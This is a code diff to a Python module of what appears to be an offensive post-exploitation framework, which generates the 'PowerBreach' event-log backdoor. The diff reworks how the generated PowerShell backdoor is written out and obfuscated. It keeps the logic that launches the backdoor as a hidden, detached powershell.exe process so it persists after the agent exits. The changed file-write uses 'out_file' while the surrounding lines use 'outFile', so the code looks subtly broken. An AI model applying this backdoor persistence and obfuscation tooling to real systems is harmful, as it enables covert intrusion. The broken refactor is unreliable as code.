@@ -87,15 +87,10 @@ Invoke-EventLogBackdoor"""
             if not os.path.exists(os.path.dirname(outFile)) and os.path.dirname(outFile) != '':
                 os.makedirs(os.path.dirname(outFile))
 
-            f = open(outFile, 'w')
-            f.write(script)
-            f.close()
+            with open(out_file, 'w') as f:
+                f.write(script)
 
             return handle_error_message("[+] PowerBreach deaduser backdoor written to " + outFile)
-
-        script = data_util.keyword_obfuscation(script)
-        if obfuscate:
-            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
 
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
@@ -107,8 +102,5 @@ Invoke-EventLogBackdoor"""
         # set up the start-process command so no new windows appears
         script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
 
-        if main_menu.obfuscate:
-            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(script=script, script_end='', obfuscate=obfuscate, obfuscation_command=obfuscation_command)
         return script
